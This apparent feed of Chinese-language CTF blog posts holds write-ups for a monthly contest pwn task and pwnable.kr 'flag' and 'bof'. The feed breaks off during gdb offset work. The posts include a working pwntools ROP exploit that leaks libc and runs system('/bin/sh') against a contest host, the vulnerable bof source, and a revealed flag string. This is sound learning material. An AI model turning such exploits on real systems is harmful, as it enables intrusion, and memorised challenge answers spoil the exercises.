    <id>http://lxzmads.github.io/2019/02/25/月赛乙队题目记录-2019-02-24/</id>
    <published>2019-02-24T16:00:00.000Z</published>
    <updated>2019-03-18T03:56:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>初来乍到, 第一个星期就加了一个打CTF的学长, 把我拉到了队伍里面. 紧接着第一个周末刚好就赶上一月一次的月赛. 由于太菜, 打的是乙队比赛. 平时谈笑风生的队友们, 一到比赛都发现好强啊, 直接把题目就AK了(惊了). 由于当时报的是pwn方向, 一天除了看了道不简单的签到题(coding)外, 就在看pwn了. 也算运气好吧, 有个大佬早就本地getshell然而给的libc不对, 远程出了问题他就不打了, 被我搞了一下午然后抢了先机hhh. (emm, 好像是第二次在比赛中做出pwn题, 感觉还行.</p><h1 id="pwn-new"><a href="#pwn-new" class="headerlink" title="pwn_new"></a>pwn_new</h1><p>nc 124.16.75.161 40005</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><a href="https://youtu.be/vHvbqZZ6e5k" target="_blank" rel="noopener">视频讲解</a></p><p>题目只给了binary, 下载下来checksec一下,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>发现只开了NX, 乙队的题还是来的比较直接的. 跑了一下, 有三个功能, </p><blockquote><p>Please input your choice:<br>1: Edit Your User<br>2: Show Your Info<br>3: Exit<br>1<br>Please input your name:<br>mads<br>Please input your description:<br>script kid<br>Please input your choice:<br>1: Edit Your User<br>2: Show Your Info<br>3: Exit<br>2<br>User name: mads<br>Description: script kid<br>Please input your choice:<br>1: Edit Your User<br>2: Show Your Info<br>3: Exit<br>3</p></blockquote><p>功能挺简单的, 拖进IDA反编译得到源码, <code>main</code>函数就是基本的逻辑分支, 没找到什么漏洞. 在<code>read_input</code>函数发现了问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">read_input</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-71h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x65</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) != <span class="number">0</span> &amp;&amp; buf != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">    s[v2] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(a1, s, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个用于读取我们输入的名字与描述的函数, 先用一个s数组临时存入我们的输入, 然后再利用<code>strncpy</code>函数拷贝到<code>bss</code>段. 但是由于读入的时候终止判断的条件并不是字符个数, 而是换行符, 这就导致s数组下标的越界写. 这里由于是一个字符一个字符的读, 所以应该是只能越界读写s上下255偏移(一个字节)的地址, 但是足够可以在栈上进行ROP了. 具体思路如下</p><ol><li><p>因为是64位程序, 传参是通过寄存器来, 所以先用<code>ROPGadget</code>工具搜索一个<code>pop edi;ret;</code>的<code>gadget</code>来后续传参. 然后通过构造栈上ROP将一个libc函数的GOT地址传给<code>printf</code>函数, leak出一个libc函数地址. 这里我选的是<code>read</code>函数, 然后在ROP链的末尾跳转到<code>main</code>函数(跳到<code>read_input</code>函数出现了问题, 猜测是栈布局有问题).</p></li><li><p>得到一个libc函数后, 计算出libc基地址以及<code>system</code>函数与<code>binsh</code>字符串的地址. 然后进行第二次ROP直接跳到<code>system(&#39;/bin/sh&#39;)</code>拿到shell</p></li></ol><p>EXP如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./main'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'124.16.75.161'</span>,<span class="number">40005</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0x4006f4</span></span><br><span class="line">pop_edi = <span class="number">0x400833</span></span><br><span class="line">pop_rsi_pop_r15 = <span class="number">0x400831</span></span><br><span class="line">read_input = <span class="number">0x400607</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, """b *0x400694\ncontinue""")</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">'A'</span>*<span class="number">108</span> + chr(<span class="number">120</span>) + p64(pop_edi) + p64(elf.got[<span class="string">'read'</span>]) + p64(printf_addr) + p64(<span class="number">0xdeadbeaf</span>) + p64(main_addr)</span><br><span class="line">edit(name)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + next(libc.search(<span class="string">"/bin/sh\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc: '</span> + hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system: '</span> + hex(system)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh: '</span> + hex(binsh)</span><br><span class="line"></span><br><span class="line">name2 = <span class="string">'A'</span>*<span class="number">108</span> + chr(<span class="number">120</span>) + p64(pop_edi) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">edit(name2)</span><br><span class="line"><span class="comment">#gdb.attach(p, """b *0x400694\ncontinue""")</span></span><br><span class="line">p.sendline(name2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="coding"><a href="#coding" class="headerlink" title="coding"></a>coding</h1><p>nc 124.16.75.161 40006</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>是一道解带模方程组的题, 看起来很简单, 然后怎么搞都做不出来嘤嘤嘤. (好像要用到数论的知识) 贴个队友答案, 有时间研究一下. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2 -i</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">Local = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> Local:</span><br><span class="line">host = <span class="string">'124.16.75.161'</span></span><br><span class="line">port = <span class="number">40006</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">default_host = <span class="string">'124.16.75.161'</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> default_host</span><br><span class="line">port = <span class="number">40006</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uv</span><span class="params">(m,n)</span>:</span></span><br><span class="line">    </span><br><span class="line">s = m % n</span><br><span class="line">t = m // n</span><br><span class="line"><span class="keyword">if</span> (n%s == <span class="number">0</span>):</span><br><span class="line">    u = <span class="number">1</span></span><br><span class="line">    v = -t</span><br><span class="line">    <span class="comment">#print(u,v)</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    x,y = uv(n,s)</span><br><span class="line">    u = y</span><br><span class="line">    v = x-y*t</span><br><span class="line">    <span class="comment">#print(u,v)</span></span><br><span class="line"><span class="keyword">return</span> u,v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line"><span class="keyword">if</span> a%b == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">u,_=uv(a,b)</span><br><span class="line"><span class="keyword">return</span> c/gcd(a,b)*u</span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">s = r.recvuntil(<span class="string">'x='</span>)</span><br><span class="line">s = s.split(<span class="string">','</span>)[<span class="number">0</span>].split(<span class="string">'*'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">v1 = s.split(<span class="string">')'</span>)[<span class="number">0</span>]</span><br><span class="line">l = s.split(<span class="string">'%'</span>)[<span class="number">1</span>]</span><br><span class="line">v2 = l.split(<span class="string">'='</span>)[<span class="number">0</span>]</span><br><span class="line">v3 = l.split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> v1</span><br><span class="line"><span class="keyword">print</span> v2</span><br><span class="line"><span class="keyword">print</span> v3</span><br><span class="line">res = solve(int(v1), int(v2), int(v3))</span><br><span class="line">r.sendline(str(res))</span><br><span class="line">pl = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">r.send(pl)</span><br><span class="line">raw_input(<span class="string">'continue -&gt;'</span>)</span><br><span class="line">pl = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>对了, 又有大佬在github发现了原题. </p><p><a href="https://github.com/ThinerDAS/what-is-ctf/tree/master/nc-game2" target="_blank" rel="noopener">https://github.com/ThinerDAS/what-is-ctf/tree/master/nc-game2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;初来乍到, 第一个星期就加了一个打CTF的学长, 把我拉到了队伍里面. 紧接着第一个周末刚好就赶上一月一次的月赛. 由于太菜, 打的是乙队比赛. 平时谈笑风生的队友们, 一到比赛都发现好强啊, 直接把题目就AK了(惊了). 由于当时报的是pwn方向, 一天除了看了道不简单的
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="月赛" scheme="http://lxzmads.github.io/tags/%E6%9C%88%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>从零开刷PWNABLE.KR系列-flag</title>
    <link href="http://lxzmads.github.io/2019/02/23/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%88%B7PWNABLE.KR%E7%B3%BB%E5%88%97-flag/"/>
    <id>http://lxzmads.github.io/2019/02/23/从零开刷PWNABLE.KR系列-flag/</id>
    <published>2019-02-22T16:00:00.000Z</published>
    <updated>2019-02-25T07:13:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>啊最近最毕设, 各种看RFC文档熟悉协议, 真的头大, 偷懒刷下题.</p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>Papa brought me a packed present! let’s open it.</p><p>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a></p><p>This is reversing task. all you need is binary</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>题目提示需要逆向, 只给了一个binary. 下载下来之后, 先跑一下, 输出<code>I will malloc() and strcpy the flag there. take it.</code>之后就退出了, flag呢? 心想事情并没有这么简单, 于是拖进IDA. IDA打开之后, 发现左边函数窗口函数很少, 只有四个. 并且只有start函数可以反编译， 其他函数都是汇编代码, 也不知道在做什么. 除此之外,  <code>import</code>的函数数量也为0. 之后在<code>strings</code>窗口看到<code>upx.sf.net</code>的字样, 于是去google了一下, 原来是一种可执行文件打包程序.</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/img/20190223171550.png" alt="20190223171550.png"></p><p>没深究原理, 以后在慢慢学吧(狗头). 在<a href="https://linux.die.net/man/1/upx" target="_blank" rel="noopener">这里</a>找到了unpack的工具, 直接<code>apt get</code>安装之后<code>-d</code>一把梭就得到了没有压缩的binary, 终于又可以开心的动态调试了.</p><p>gdb打开, 反汇编<code>main</code>函数, 发现程序逻辑还是很简单的, 也就是程序一开始输出的那句话的意思, <code>I will malloc() and strcpy the flag there. take it.</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x0000000000401164 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x0000000000401165 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000401168 &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">   0x000000000040116c &lt;+8&gt;:mov    edi,0x496658</span><br><span class="line">   0x0000000000401171 &lt;+13&gt;:call   0x402080 &lt;puts&gt;</span><br><span class="line">   0x0000000000401176 &lt;+18&gt;:mov    edi,0x64</span><br><span class="line">   0x000000000040117b &lt;+23&gt;:call   0x4099d0 &lt;malloc&gt;</span><br><span class="line">   0x0000000000401180 &lt;+28&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401184 &lt;+32&gt;:mov    rdx,QWORD PTR [rip+0x2c0ee5]        <span class="comment"># 0x6c2070 &lt;flag&gt;</span></span><br><span class="line">   0x000000000040118b &lt;+39&gt;:mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x000000000040118f &lt;+43&gt;:mov    rsi,rdx</span><br><span class="line">   0x0000000000401192 &lt;+46&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000401195 &lt;+49&gt;:call   0x400320</span><br><span class="line">   0x000000000040119a &lt;+54&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040119f &lt;+59&gt;:leave</span><br><span class="line">   0x00000000004011a0 &lt;+60&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可以看出<code>main+0x401195</code>处的函数<code>0x400320</code>应该就是最后调用的<code>strcpy</code>函数, 在这里下个断点, 岂不是就可以让<code>flag</code>现原形了? 说着就干, 两条命令一翘, <code>run</code>！ 发现<code>flag</code>就乖乖出来了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x400320 (</span><br><span class="line">   <span class="variable">$rdi</span> = 0x00000000006c96b0 → 0x0000000000000000,</span><br><span class="line">   <span class="variable">$rsi</span> = 0x0000000000496628 → <span class="string">"UPX...? sounds like a delivery service :)"</span>,</span><br><span class="line">   <span class="variable">$rdx</span> = 0x0000000000496628 → <span class="string">"UPX...? sounds like a delivery service :)"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>strcpy</code>的<code>source</code>参数即<code>rsi</code>寄存器中, 就是我们要的flag.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;啊最近最毕设, 各种看RFC文档熟悉协议, 真的头大, 偷懒刷下题.&lt;/p&gt;
&lt;h1 id=&quot;flag&quot;&gt;&lt;a href=&quot;#flag&quot; class=&quot;headerlink&quot; title=&quot;flag&quot;&gt;&lt;/a&gt;flag&lt;/h1&gt;&lt;p&gt;Papa brought me a pa
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
      <category term="PWN" scheme="http://lxzmads.github.io/tags/PWN/"/>
    
      <category term="PWNABLE.KR" scheme="http://lxzmads.github.io/tags/PWNABLE-KR/"/>
    
  </entry>
  
  <entry>
    <title>从零开刷PWNABLE.KR系列-bof</title>
    <link href="http://lxzmads.github.io/2019/02/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%88%B7PWNABLE.KR%E7%B3%BB%E5%88%97-bof/"/>
    <id>http://lxzmads.github.io/2019/02/21/从零开刷PWNABLE.KR系列-bof/</id>
    <published>2019-02-20T16:00:00.000Z</published>
    <updated>2019-02-21T12:15:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天开刷第三道题bof, 遇到个小坑就是题目有buffer, 导致好久我都以为题目炸了hhh. 虽然还是很简单的入门题, 但是也做了挺久的, 哎tcl.</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?</p><p>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a></p><p>Running at : nc pwnable.kr 9000</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这次是远程打, 但是也给了源码, 下载得到源码: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>func</code>函数存在危险函数<code>gets</code>, 于是思路就是利用这个溢出覆盖<code>key</code>这个形参为<code>0xcafebabe</code>即可拿到shell. 首先检查一下开了哪些保护, </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># checksec bof</span></span><br><span class="line">[*] <span class="string">'/root/learning/pwn/pwnable.kr/bof/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>发现所有保护基本都开了, 但是对于这题来说, 有阻碍的应该只是<code>Canary</code>这个保护. 但是测试一下会发现， <code>Canary</code>的检查是在函数即将返回时, 所以对于我们这题来说没有阻碍. 这题麻烦之处在于<code>Canary</code>的存在, 我们没法直接利用塞满栈的形式计算出溢出点到要覆盖变量到偏移. 于是我就只能打开gdb, 动态调试手工计算偏移.</p><p>打开gdb, 载入gef插件方便观看, 在<code>func</code>处下个断点<code>ni</code>单步调试,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb -q bof</span></span><br><span class="line">Reading symbols from bof...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">source</span> ~/.gdbinit-gef.py</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">' to start, `gef config'</span> to configure</span><br><span class="line">70 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 3 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">gef➤  b func</span><br><span class="line">Breakpoint 1 at 0x632</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/learning/pwn/pwnable.kr/bof/bof</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x56555632 <span class="keyword">in</span> func ()</span><br></pre></td></tr></table></figure><p>跑到<code>gets</code>函数传参的地方停下, 查看<code>overflowme</code>变量的地址, </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  0x56555637 &lt;func+11&gt;        add    BYTE PTR [ecx-0x3fce0bbb], cl</span><br><span class="line">  0x5655563d &lt;func+17&gt;        mov    DWORD PTR [esp], 0x5655578c</span><br><span class="line">  0x56555644 &lt;func+24&gt;        call   0xf7e61ca0 &lt;puts&gt;</span><br><span class="line">→ 0x56555649 &lt;func+29&gt;        lea    eax, [ebp-0x2c]</span><br><span class="line">  0x5655564c &lt;func+32&gt;        mov    DWORD PTR [esp], eax</span><br><span class="line">  0x5655564f &lt;func+35&gt;        call   0xf7e613e0 &lt;gets&gt;</span><br><span class="line">  0x56555654 &lt;func+40&gt;        cmp    DWORD PTR [ebp+0x8], 0xcafebabe</span><br><span class="line">  0x5655565b &lt;func+47&gt;        jne    0x5655566b &lt;func+63&gt;</span><br><span class="line">  0x5655565d &lt;func+49&gt;        mov    DWORD PTR [esp], 0x5655579b</span><br></pre></td></tr></table></figure><p>地址就存在<code>eax</code>寄存器中.继续<code>ni</code>单步, 在运行到关键的<code>if</code>判断处停下来, </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  0x56555648 &lt;func+28&gt;        mov    eax, ds:0x89d4458d</span><br><span class="line">  0x5655564d &lt;func+33&gt;        add    al, 0x24</span><br><span class="line">  0x5655564f &lt;func+35&gt;        call   0xf7e613e0 &lt;gets&gt;</span><br><span class="line">→ 0x56555654 &lt;func+40&gt;        cmp    DWORD PTR [ebp+0x8], 0xcafebabe</span><br><span class="line">  0x5655565b &lt;func+47&gt;        jne    0x5655566b &lt;func+63&gt;</span><br><span class="line">  0x5655565d &lt;func+49&gt;        mov    DWORD PTR [esp], 0x5655579b</span><br><span class="line">  0x56555664 &lt;func+56&gt;        call   0xf7e3cda0 &lt;system&gt;</span><br><span class="line">  0x56555669 &lt;func+61&gt;        jmp    0x56555677 &lt;func+75&gt;</span><br><span class="line">  0x5655566b &lt;func+63&gt;        mov    DWORD PTR [esp], 0x565557a3</span><br></pre></td></tr></table></figure><p>发现是将<code>ebp+0x8</code>地址处的值与<code>0xcafebabe</code>比较, 即<code>key</code>变量的地址. 再将<code>overflowme</code>变量地址(eax寄存器)与<code>ebp+0x8</code>的值相减即可得到偏移.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info reg eax</span><br><span class="line">eax            0xffffd43c0xffffd43c</span><br><span class="line">gef➤  info reg ebp</span><br><span class="line">ebp            